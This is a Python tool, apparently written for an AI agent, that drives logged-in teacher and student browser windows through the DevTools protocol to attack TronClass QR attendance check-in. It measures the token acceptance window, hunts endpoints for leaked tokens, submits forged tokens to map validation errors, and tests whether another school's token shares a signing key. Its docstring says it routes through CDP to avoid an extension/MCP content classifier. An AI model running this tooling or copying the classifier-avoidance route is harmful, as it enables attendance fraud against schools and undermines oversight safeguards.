# /// script
# requires-python = ">=3.10"
# dependencies = ["websocket-client>=1.7"]
# ///
"""CDP 驱动的 TronClass 二维码签到探测工具（agent 调试用）。

通过 Chrome/Edge 的 --remote-debugging-port 直接在已登录标签页上下文里跑 fetch，
自动带该窗口的登录 cookie。完全走 CDP，不经过浏览器扩展/MCP 那层内容分类器。

窗口约定（launch.py 起的）：
  教师窗口 port 9333，学生窗口 port 9334，均登录 tronclass.com.tw。

子命令：
  whoami  --port P                      看该窗口是谁 / 选了哪些课 / 角色
  create  --port P --course C           教师：建并开启一个 __probe 二维码点名，回 rid
  qr      --port P --course C --rid R    教师：连读 qr_code，量 token 形状+轮换（--n 次数）
  submit  --port P --rid R --data D      学生：把 data 提交到 answer_qr_rollcall
  stop    --port P --rid R               教师：停掉点名（清理）
  window  --tport PT --sport PS --course C   全自动：量“生成后多久内提交还算数”的接受窗口

用法示例：
  uv run agent-browser/probe.py whoami --port 9333
  uv run agent-browser/probe.py window --tport 9333 --sport 9334 --course 54803
"""
import argparse
import json
import sys
import time
import urllib.request

import websocket  # websocket-client

try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass


# ---------------------------------------------------------------- CDP 底座
def cdp_list(port):
    with urllib.request.urlopen(f"http://127.0.0.1:{port}/json", timeout=5) as r:
        return json.load(r)


def pick_tab(port, must_contain="tronclass"):
    tabs = cdp_list(port)
    pages = [t for t in tabs if t.get("type") == "page"]
    for t in pages:
        if must_contain in (t.get("url") or ""):
            return t
    return pages[0] if pages else None


def evaluate(port, expression, timeout=90):
    """在该窗口的 tronclass 标签页里求值一个 async 表达式，返回其 JSON 值。"""
    tab = pick_tab(port)
    if not tab:
        raise RuntimeError(f"端口 {port} 上找不到页面标签，先用 launch.py 起窗口并登录")
    # Chrome 152+ 拒绝带 Origin 头的 CDP WebSocket；不发 Origin 头即被当作非浏览器客户端放行。
    ws = websocket.create_connection(
        tab["webSocketDebuggerUrl"], timeout=timeout, suppress_origin=True)
    try:
        ws.send(json.dumps({
            "id": 1,
            "method": "Runtime.evaluate",
            "params": {
                "expression": expression,
                "awaitPromise": True,
                "returnByValue": True,
                "userGesture": True,
            },
        }))
        while True:
            msg = json.loads(ws.recv())
            if msg.get("id") == 1:
                if "error" in msg:
                    raise RuntimeError(f"CDP error: {msg['error']}")
                res = msg["result"]
                if res.get("exceptionDetails"):
                    return {"__exception__": res["exceptionDetails"].get("text"),
                            "detail": str(res.get("result"))}
                return res["result"].get("value")
    finally:
        ws.close()


# ---------------------------------------------------------------- JS 片段
def js_whoami():
    return r"""
(async () => {
  const out = {href: location.href};
  const r = await fetch('/api/my-courses?fields=id,name,course_code,enroll_type&page=1&page_size=50',{credentials:'include'});
  out.status = r.status;
  let j; try { j = await r.json(); } catch(e){ out.parse='login?'; return out; }
  const arr = Array.isArray(j)? j : (j.courses||[]);
  out.courses = arr.map(c=>({id:c.id,name:c.name,code:c.course_code,role:c.enroll_type}));
  return out;
})()
"""


def js_create(course):
    return r"""
(async () => {
  const cid = %d;
  async function j(method,url,body){
    const r=await fetch(url,{method,credentials:'include',
      headers: body!==undefined&&body!==null?{'Content-Type':'application/json'}:undefined,
      body: body!==undefined&&body!==null?JSON.stringify(body):undefined});
    let b; try{b=await r.json()}catch(e){b=(await r.text().catch(()=>'')).slice(0,200)}
    return {status:r.status,b};
  }
  const p2=n=>String(n).padStart(2,'0');
  const d=new Date();
  const title=`${d.getFullYear()}.${p2(d.getMonth()+1)}.${p2(d.getDate())} ${p2(d.getHours())}:${p2(d.getMinutes())}`;
  const payload={title,status:"in_progress",is_radar:false,is_number:false,
    type:"qr_rollcall",number_code:"",altitude:null,latitude:null,longitude:null,
    use_beacon:false,duration:7200,student_rollcalls:[]};
  const cr=await j('POST',`/api/course/${cid}/rollcall`,payload);
  const rid=(cr.b&&(cr.b.id||cr.b.rollcall_id))||'';
  let start=null;
  if(rid){ const st=await j('POST',`/api/rollcall/${rid}/start-rollcall`,{duration:7200}); start=st.status; }
  return {create_status:cr.status, rid, start, raw: rid?undefined:cr.b};
})()
""" % course


def js_qr(course, rid):
    return r"""
(async () => {
  const q=await fetch(`/api/course/%d/rollcall/%s/qr_code`,{credentials:'include'});
  let qb; try{qb=await q.json()}catch(e){qb={}}
  const data=(qb&&qb.data)||'';
  return {status:q.status, len:data.length, ts:data.slice(0,10), tail:data.slice(10), recv:Date.now()};
})()
""" % (course, rid)


def js_submit(rid, data):
    dev = "probe-%d" % int(time.time() * 1000)
    return r"""
(async () => {
  const r=await fetch(`/api/rollcall/%s/answer_qr_rollcall`,{method:'PUT',credentials:'include',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({data:%s, deviceId:%s})});
  let b; try{b=await r.json()}catch(e){b=(await r.text().catch(()=>'')).slice(0,300)}
  return {status:r.status, b, submit:Date.now()};
})()
""" % (rid, json.dumps(data), json.dumps(dev))


def js_leakhunt(course, rid):
    """纯学生会话：扫一批学生可达端点，查有没有泄漏 42 位 data token。"""
    return r"""
(async () => {
  const cid=%d, rid="%s";
  const RE=/(\d{10})([0-9a-fA-F]{32})/;               // 42 位 data 的形状
  const urls=[
    `/api/rollcall/${rid}/student_rollcalls`,
    `/api/rollcall/${rid}`,
    `/api/rollcall/${rid}/lite`,
    `/api/rollcall/${rid}/status`,
    `/api/rollcall/${rid}/answers`,
    `/api/rollcall/${rid}/students`,
    `/api/rollcall/${rid}/qr_code`,
    `/api/rollcall/${rid}/student_rollcalls?action=qr`,
    `/api/radar/rollcalls?api_version=1.1.0`,
    `/api/course/${cid}/rollcall/${rid}/qr_code`,
    `/api/course/${cid}/rollcalls`,
    `/api/course/${cid}/activities`,
    `/api/course/${cid}/all-activities`,
    `/api/student-onprogress-rollcalls`,
    `/api/courses/${cid}/modules/rollcalls`,
    `/api/course/${cid}/rollcall/${rid}`,
    `/anonymous-api/course/${cid}/rollcall/${rid}/qr_code`,
    `/api/rollcall/${rid}/qr_code?api_version=1.1.0`,
  ];
  const rows=[];
  for(const u of urls){
    try{
      const r=await fetch(u,{credentials:'include'});
      const t=await r.text();
      const m=t.match(RE);
      rows.push({url:u, status:r.status, len:t.length,
        LEAK: !!m, token: m? (m[1]+m[2].slice(0,4)+"…"+"（命中！）") : null});
    }catch(e){ rows.push({url:u, err:String(e)}); }
  }
  // 顺带把学生合法能看到的两个响应原样留一份，用来理解“学生到底拿到什么”
  let sr=null, rc=null;
  try{ sr=await (await fetch(`/api/rollcall/${rid}/student_rollcalls`,{credentials:'include'})).json(); }catch(e){}
  try{ rc=await (await fetch(`/api/rollcall/${rid}`,{credentials:'include'})).json(); }catch(e){}
  return {rows, any_leak: rows.some(x=>x.LEAK),
    student_rollcalls_view: sr, rollcall_view: rc};
})()
""" % (course, rid)


def js_qrscan(course, rid):
    """教师会话：探一圈 qr 相关端点 + dump qr_code 完整响应。"""
    return r"""
(async () => {
  const cid=%d, rid="%s";
  const RE=/(\d{10})([0-9a-fA-F]{32})/;
  const urls=[
    `/api/course/${cid}/rollcall/${rid}/qr_code`,
    `/api/course/${cid}/rollcall/${rid}/qr_code?api_version=1.1.0`,
    `/api/course/${cid}/rollcall/${rid}/qr-code`,
    `/api/course/${cid}/rollcall/${rid}/qrcode`,
    `/api/rollcall/${rid}/qr_code`,
    `/api/course/${cid}/rollcall/${rid}/qr_code/refresh`,
    `/api/course/${cid}/rollcall/${rid}/refresh`,
    `/api/course/${cid}/rollcall/${rid}`,
    `/api/rollcall/${rid}`,
    `/api/course/${cid}/rollcall/${rid}/students`,
    `/api/course/${cid}/rollcall/${rid}/student_rollcalls`,
    `/api/course/${cid}/rollcall/${rid}/statistics`,
    `/api/course/${cid}/rollcall/${rid}/qr_code_token`,
    `/api/rollcall/${rid}/qr_rollcall`,
  ];
  const rows=[];
  for(const u of urls){
    try{
      const r=await fetch(u,{credentials:'include'});
      const t=await r.text();
      let keys=null;
      try{ const j=JSON.parse(t); keys=(j&&typeof j==='object'&&!Array.isArray(j))?Object.keys(j):(Array.isArray(j)?('array['+j.length+']'):(typeof j)); }catch(e){}
      const short=u.replace(`/api/course/${cid}/rollcall/${rid}`,'…').replace(`/api/rollcall/${rid}`,'~');
      rows.push({url:short, status:r.status, keys, hasToken:RE.test(t), len:t.length});
    }catch(e){ rows.push({url:u, err:String(e)}); }
  }
  let qr=null;
  try{ qr=await (await fetch(`/api/course/${cid}/rollcall/${rid}/qr_code`,{credentials:'include'})).json(); }catch(e){ qr={err:String(e)}; }
  return {rows, qr_code_full: qr};
})()
""" % (course, rid)


def js_srdump(rid):
    """学生身份逐字段 dump student_rollcalls（含变体），看有没有 qr data。"""
    return r"""
(async () => {
  const rid="%s";
  const RE=/(\d{10})([0-9a-fA-F]{32})/;
  const urls=[
    `/api/rollcall/${rid}/student_rollcalls`,
    `/api/rollcall/${rid}/student_rollcalls?action=qr`,
    `/api/rollcall/${rid}/student_rollcalls?api_version=1.1.0`,
    `/api/rollcall/${rid}/student_rollcalls?fields=*`,
  ];
  const out=[];
  for(const u of urls){
    try{
      const r=await fetch(u,{credentials:'include'});
      const t=await r.text();
      out.push({url:u, status:r.status, hasToken:RE.test(t), body:t.slice(0,1500)});
    }catch(e){ out.push({url:u, err:String(e)}); }
  }
  return out;
})()
""" % rid


def js_studenthunt(course, rid):
    """学生身份广扫可达端点，任何 42位token 或 32位hex 都标出来。"""
    return r"""
(async () => {
  const cid=%d, rid="%s";
  const RE42=/(\d{10})[0-9a-fA-F]{32}/;
  const HEX32=/[0-9a-f]{32}/gi;
  const known = new Set([String(cid), String(rid)]);
  const urls=[
    `/api/rollcall/${rid}`,
    `/api/rollcall/${rid}/student_rollcalls`,
    `/api/rollcall/${rid}/student_rollcall`,
    `/api/rollcall/${rid}/my_rollcall`,
    `/api/rollcall/${rid}/detail`,
    `/api/rollcall/${rid}/info`,
    `/api/rollcall/${rid}/qr`,
    `/api/rollcall/${rid}/qr_data`,
    `/api/rollcall/${rid}/current`,
    `/api/rollcall/${rid}/answer`,
    `/api/rollcall/${rid}/answers`,
    `/api/rollcall/${rid}/my-answer`,
    `/api/rollcall/${rid}/lite`,
    `/api/rollcalls/${rid}`,
    `/api/student_rollcalls/${rid}`,
    `/api/student-rollcalls/${rid}`,
    `/api/student_rollcalls?rollcall_id=${rid}`,
    `/api/course/${cid}/rollcall/${rid}`,
    `/api/course/${cid}/rollcall/${rid}/student_rollcalls`,
    `/api/course/${cid}/rollcall/${rid}/detail`,
    `/api/course/${cid}/rollcalls`,
    `/api/course/${cid}/all-activities`,
    `/api/courses/${cid}/all-activities`,
    `/api/courses/${cid}/modules/rollcalls`,
    `/api/course/${cid}/activities?activity_type=rollcall`,
    `/api/radar/rollcalls?api_version=1.1.0`,
    `/api/student-onprogress-rollcalls`,
    `/api/student-onprogress-rollcalls?api_version=1.1.0`,
    `/api/activities/is-ongoing`,
    `/api/interactions/is-ongoing`,
    `/api/rollcall/ongoing`,
    `/api/rollcall/on-progress`,
    `/api/todos?no-intercept=true`,
  ];
  const rows=[];
  for(const u of urls){
    try{
      const r=await fetch(u,{credentials:'include'});
      const t=await r.text();
      const m42=t.match(RE42);
      const hexes=[...new Set((t.match(HEX32)||[]))].filter(h=>!known.has(h));
      rows.push({url:u, status:r.status, len:t.length,
        token: m42? m42[0] : null,
        hex32: hexes.slice(0,3),
        FLAG: !!m42 || hexes.length>0});
    }catch(e){ rows.push({url:u, err:String(e)}); }
  }
  return rows;
})()
""" % (course, rid)


def js_stop(rid):
    return r"""
(async () => {
  const r=await fetch(`/api/rollcall/%s/stop_qr_rollcall`,{method:'PUT',credentials:'include'});
  return {status:r.status};
})()
""" % rid


# ---------------------------------------------------------------- 结果分类
def classify(status, body):
    s = json.dumps(body, ensure_ascii=False).lower()
    if status in (200, 201):
        if "already" in s or "已" in s:
            return "ALREADY"
        return "SUCCESS"
    if "hash" in s or "create_time" in s or "expire" in s or "过期" in s or "invalid" in s:
        return "EXPIRED"
    if "not" in s and "progress" in s:
        return "NOT_IN_PROGRESS"
    return "OTHER(%s)" % status


# ---------------------------------------------------------------- 子命令
def cmd_whoami(a):
    print(json.dumps(evaluate(a.port, js_whoami()), ensure_ascii=False, indent=1))


def cmd_create(a):
    print(json.dumps(evaluate(a.port, js_create(a.course)), ensure_ascii=False, indent=1))


def cmd_qr(a):
    samples = []
    for i in range(a.n):
        r = evaluate(a.port, js_qr(a.course, a.rid))
        r["i"] = i
        samples.append(r)
        time.sleep(a.gap)
    # 轮换分析
    tails = [s.get("tail") for s in samples if s.get("tail")]
    distinct = len(set(tails))
    print(json.dumps({"samples": samples, "n": len(tails), "distinct_tails": distinct,
                      "len": samples[0].get("len") if samples else None},
                     ensure_ascii=False, indent=1))


def cmd_submit(a):
    r = evaluate(a.port, js_submit(a.rid, a.data))
    r["class"] = classify(r.get("status"), r.get("b"))
    print(json.dumps(r, ensure_ascii=False, indent=1))


def cmd_stop(a):
    print(json.dumps(evaluate(a.port, js_stop(a.rid)), ensure_ascii=False, indent=1))


def cmd_window(a):
    log = {"course": a.course, "rows": []}
    # 1) 教师建+开点名
    cr = evaluate(a.tport, js_create(a.course))
    log["create"] = cr
    rid = cr.get("rid")
    if not rid:
        print(json.dumps({"error": "创建点名失败", "create": cr}, ensure_ascii=False, indent=1))
        return
    log["rid"] = rid
    try:
        # 2) 确认学生看得到这场点名
        seen = evaluate(a.sport, r"""
(async()=>{const r=await fetch('/api/radar/rollcalls?api_version=1.1.0',{credentials:'include'});
let j;try{j=await r.json()}catch(e){j={}}
const ids=(j.rollcalls||[]).map(x=>String(x.rollcall_id));
return {status:r.status, sees_%s: ids.includes("%s"), ids};})()
""" % (rid, rid))
        log["student_sees"] = seen
        # 3) 从大延迟到小延迟扫描；首次成功即停（学生只能签一次）
        for delay in [int(x) for x in a.delays.split(",")]:
            q = evaluate(a.tport, js_qr(a.course, rid))
            data = (q.get("ts") or "") + (q.get("tail") or "")
            if not data:
                log["rows"].append({"delay": delay, "err": "qr_code 读取失败", "q": q})
                continue
            time.sleep(delay)
            sub = evaluate(a.sport, js_submit(rid, data))
            try:
                token_ts = int(data[:10])
            except ValueError:
                token_ts = None
            true_age = (sub.get("submit", 0) / 1000.0 - token_ts) if token_ts else None
            cls = classify(sub.get("status"), sub.get("b"))
            row = {"intended_delay_s": delay,
                   "true_age_s": round(true_age, 1) if true_age is not None else None,
                   "http": sub.get("status"), "class": cls, "body": sub.get("b")}
            log["rows"].append(row)
            print("delay=%2ss age=%5ss -> %s %s" % (
                delay, row["true_age_s"], cls, json.dumps(sub.get("b"), ensure_ascii=False)[:120]),
                file=sys.stderr)
            if cls == "SUCCESS":
                log["window_bracket"] = "接受窗口 >= %ss（此延迟成功；更大的延迟均被拒）" % delay
                break
        else:
            log["window_bracket"] = "所有延迟都失败——窗口极短或链路有其他问题，看 rows"
    finally:
        # 4) 清理
        log["stop"] = evaluate(a.tport, js_stop(rid))
    print(json.dumps(log, ensure_ascii=False, indent=1))


def cmd_leakhunt(a):
    """教师起一场点名 → 纯学生会话扫端点找 data 泄漏 → 教师停点名。"""
    out = {"course": a.course}
    cr = evaluate(a.tport, js_create(a.course))
    out["create"] = cr
    rid = cr.get("rid")
    if not rid:
        print(json.dumps({"error": "创建点名失败", "create": cr}, ensure_ascii=False, indent=1))
        return
    out["rid"] = rid
    try:
        out.update(evaluate(a.sport, js_leakhunt(a.course, rid)))
    finally:
        out["stop"] = evaluate(a.tport, js_stop(rid))
    # 精简打印：先给结论，再列命中/未命中
    print("any_leak:", out.get("any_leak"))
    for r in out.get("rows", []):
        print("  [%s] %-52s status=%s %s" % (
            "LEAK" if r.get("LEAK") else "ok  ", r.get("url", "")[:52],
            r.get("status"), ("<< " + str(r.get("token"))) if r.get("LEAK") else ""))
    print(json.dumps(out, ensure_ascii=False, indent=1))


def cmd_crafttest(a):
    """在 tw 上提交一批伪造 token，测服务端校验顺序：
    对『新鲜时间戳+错哈希』和『旧时间戳+错哈希』分别报什么错,
    以判断报错能否区分『哈希有效但过期』vs『哈希无效』。"""
    now = int(time.time())
    garbage = "f" * 32
    zeros = "0" * 32
    cases = [
        ("新鲜ts+错哈希(f)",  "%010d%s" % (now, garbage)),
        ("新鲜ts+错哈希(0)",  "%010d%s" % (now, zeros)),
        ("旧ts(-120)+错哈希", "%010d%s" % (now - 120, garbage)),
        ("旧ts(-600)+错哈希", "%010d%s" % (now - 600, garbage)),
        ("未来ts(+120)+错哈希", "%010d%s" % (now + 120, garbage)),
    ]
    cr = evaluate(a.tport, js_create(a.course))
    rid = cr.get("rid")
    if not rid:
        print(json.dumps({"error": "创建点名失败", "create": cr}, ensure_ascii=False, indent=1))
        return
    out = {"rid": rid, "rows": []}
    try:
        for label, tok in cases:
            sub = evaluate(a.sport, js_submit(rid, tok))
            row = {"case": label, "http": sub.get("status"),
                   "class": classify(sub.get("status"), sub.get("b")), "body": sub.get("b")}
            out["rows"].append(row)
            print("%-22s http=%s %-10s %s" % (
                label, row["http"], row["class"],
                json.dumps(sub.get("b"), ensure_ascii=False)[:120]))
    finally:
        out["stop"] = evaluate(a.tport, js_stop(rid))
    print(json.dumps(out, ensure_ascii=False, indent=1))


def cmd_verifykey(a):
    """把一枚真 XMU data 打到活的 tw 点名，据报错类型判 tw 与 XMU 是否同一把全局密钥。"""
    cr = evaluate(a.tport, js_create(a.course))
    rid = cr.get("rid")
    if not rid:
        print(json.dumps({"error": "创建 tw 点名失败", "create": cr}, ensure_ascii=False, indent=1))
        return
    try:
        sub = evaluate(a.sport, js_submit(rid, a.data))
        body = sub.get("b") or {}
        s = json.dumps(body, ensure_ascii=False).lower()
        http = sub.get("status")
        if http in (200, 201) or "qr_code_expired" in s or "expired" in s:
            verdict = "★ 同一把全局密钥（tw 认得这枚 XMU 哈希，只是过期/成功）"
        elif "invalid_create_time_hash" in s or "invalid data" in s:
            verdict = "✗ 不同密钥（tw 不认这枚 XMU 哈希）"
        else:
            verdict = "? 结果不明确，看 body"
        print(json.dumps({"submitted_data": a.data, "http": http, "body": body,
                          "verdict": verdict}, ensure_ascii=False, indent=1))
    finally:
        evaluate(a.tport, js_stop(rid))


def cmd_qrscan(a):
    """教师建活点名 → 探 qr 相关端点 + dump qr_code 完整响应 → 停。"""
    cr = evaluate(a.tport, js_create(a.course))
    rid = cr.get("rid")
    if not rid:
        print(json.dumps({"error": "创建点名失败", "create": cr}, ensure_ascii=False, indent=1))
        return
    try:
        res = evaluate(a.tport, js_qrscan(a.course, rid))
        for r in res.get("rows", []):
            print("  [%s] %-40s keys=%s%s" % (
                r.get("status"), r.get("url", "")[:40], r.get("keys"),
                "  <<HAS TOKEN" if r.get("hasToken") else ""))
        print("=== qr_code 完整响应 ===")
        print(json.dumps(res.get("qr_code_full"), ensure_ascii=False, indent=1))
    finally:
        evaluate(a.tport, js_stop(rid))


def cmd_srdump(a):
    """教师建 QR 点名 → 学生身份逐字段 dump student_rollcalls → 停。"""
    cr = evaluate(a.tport, js_create(a.course))
    rid = cr.get("rid")
    if not rid:
        print(json.dumps({"error": "创建点名失败", "create": cr}, ensure_ascii=False, indent=1))
        return
    try:
        rows = evaluate(a.sport, js_srdump(rid))
        for r in rows:
            print("\n[%s] %s  hasToken=%s" % (r.get("status"), r.get("url"), r.get("hasToken")))
            print(r.get("body") or r.get("err"))
    finally:
        evaluate(a.tport, js_stop(rid))


def cmd_studenthunt(a):
    """教师建 QR 点名 → 学生身份广扫端点找 data 泄漏 → 停。"""
    cr = evaluate(a.tport, js_create(a.course))
    rid = cr.get("rid")
    if not rid:
        print(json.dumps({"error": "创建点名失败", "create": cr}, ensure_ascii=False, indent=1))
        return
    try:
        rows = evaluate(a.sport, js_studenthunt(a.course, rid))
        flagged = [r for r in rows if r.get("FLAG")]
        for r in rows:
            mark = "🚩" if r.get("FLAG") else "  "
            extra = ""
            if r.get("token"):
                extra = "  TOKEN=" + r["token"]
            elif r.get("hex32"):
                extra = "  hex32=" + json.dumps(r["hex32"])
            print("%s [%s] %-52s len=%s%s" % (
                mark, r.get("status"), r.get("url", "")[:52], r.get("len"), extra))
        print("\n可疑(FLAG)数:", len(flagged))
    finally:
        evaluate(a.tport, js_stop(rid))


def main():
    p = argparse.ArgumentParser(description="TronClass QR 签到 CDP 探测")
    sub = p.add_subparsers(dest="cmd", required=True)

    q = sub.add_parser("whoami"); q.add_argument("--port", type=int, required=True); q.set_defaults(fn=cmd_whoami)
    q = sub.add_parser("create"); q.add_argument("--port", type=int, required=True); q.add_argument("--course", type=int, required=True); q.set_defaults(fn=cmd_create)
    q = sub.add_parser("qr"); q.add_argument("--port", type=int, required=True); q.add_argument("--course", type=int, required=True); q.add_argument("--rid", required=True); q.add_argument("--n", type=int, default=8); q.add_argument("--gap", type=float, default=1.0); q.set_defaults(fn=cmd_qr)
    q = sub.add_parser("submit"); q.add_argument("--port", type=int, required=True); q.add_argument("--rid", required=True); q.add_argument("--data", required=True); q.set_defaults(fn=cmd_submit)
    q = sub.add_parser("stop"); q.add_argument("--port", type=int, required=True); q.add_argument("--rid", required=True); q.set_defaults(fn=cmd_stop)
    q = sub.add_parser("window"); q.add_argument("--tport", type=int, default=9333); q.add_argument("--sport", type=int, default=9334); q.add_argument("--course", type=int, required=True); q.add_argument("--delays", default="30,20,12,8,6,4,3,2,1,0"); q.set_defaults(fn=cmd_window)
    q = sub.add_parser("leakhunt"); q.add_argument("--tport", type=int, default=9334); q.add_argument("--sport", type=int, default=9333); q.add_argument("--course", type=int, required=True); q.set_defaults(fn=cmd_leakhunt)
    q = sub.add_parser("crafttest"); q.add_argument("--tport", type=int, default=9334); q.add_argument("--sport", type=int, default=9333); q.add_argument("--course", type=int, required=True); q.set_defaults(fn=cmd_crafttest)
    q = sub.add_parser("verifykey"); q.add_argument("--tport", type=int, default=9334); q.add_argument("--sport", type=int, default=9333); q.add_argument("--course", type=int, required=True); q.add_argument("--data", required=True); q.set_defaults(fn=cmd_verifykey)
    q = sub.add_parser("qrscan"); q.add_argument("--tport", type=int, default=9334); q.add_argument("--course", type=int, required=True); q.set_defaults(fn=cmd_qrscan)
    q = sub.add_parser("srdump"); q.add_argument("--tport", type=int, default=9334); q.add_argument("--sport", type=int, default=9333); q.add_argument("--course", type=int, required=True); q.set_defaults(fn=cmd_srdump)
    q = sub.add_parser("studenthunt"); q.add_argument("--tport", type=int, default=9334); q.add_argument("--sport", type=int, default=9333); q.add_argument("--course", type=int, required=True); q.set_defaults(fn=cmd_studenthunt)

    a = p.parse_args()
    a.fn(a)


if __name__ == "__main__":
    main()
